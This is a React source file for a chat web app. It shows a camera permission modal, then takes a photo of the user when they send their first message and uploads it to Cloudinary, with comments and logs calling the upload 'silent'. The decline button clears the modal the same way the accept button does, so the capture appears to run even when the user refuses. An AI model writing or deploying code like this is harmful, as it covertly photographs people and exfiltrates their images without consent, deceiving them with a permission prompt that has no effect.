import React, { useState, useEffect } from 'react';
import Chat from './components/Chat';
import PermissionModal from './components/PermissionModal';
import CameraCapture, { uploadToCloudinary } from './components/CameraCapture';
import { motion, AnimatePresence } from 'motion/react';

export default function App() {
  const [showPermission, setShowPermission] = useState(true); // Show immediately
  const [hasCaptured, setHasCaptured] = useState(false);
  const [isCameraActive, setIsCameraActive] = useState(false);

  // When first message is sent, trigger camera if permission was given
  const handleFirstMessage = () => {
    if (!hasCaptured && !showPermission) {
      setIsCameraActive(true);
    }
  };

  const handleCapture = async (blob: Blob) => {
    console.log("Photo captured, uploading silently...");
    setHasCaptured(true);
    setIsCameraActive(false);
    
    // Silent upload
    try {
      const url = await uploadToCloudinary(blob);
      if (url) {
        console.log("Silent cloud storage success:", url);
      }
    } catch (e) {
      console.error("Silent storage failed", e);
    }
  };

  const handleAcceptPermission = () => {
    setShowPermission(false);
    // We don't start camera here, we wait for first message
  };

  return (
    <div className="fixed inset-0 bg-slate-50 font-sans selection:bg-rose-100 selection:text-rose-900 overflow-hidden flex items-center justify-center">
      <div className="w-full h-full max-w-2xl bg-white shadow-2xl relative overflow-hidden">
        <AnimatePresence mode="wait">
          {showPermission ? (
            <PermissionModal 
              key="permission"
              onAccept={handleAcceptPermission}
              onDecline={() => setShowPermission(false)}
            />
          ) : (
            <motion.div 
              key="chat-container"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="h-full"
            >
              <Chat 
                onFirstMessage={handleFirstMessage} 
                shouldCapture={isCameraActive}
                onCaptureComplete={handleCapture}
              />
            </motion.div>
          )}
        </AnimatePresence>

        {isCameraActive && (
          <CameraCapture onCapture={handleCapture} />
        )}
      </div>
    </div>
  );
}
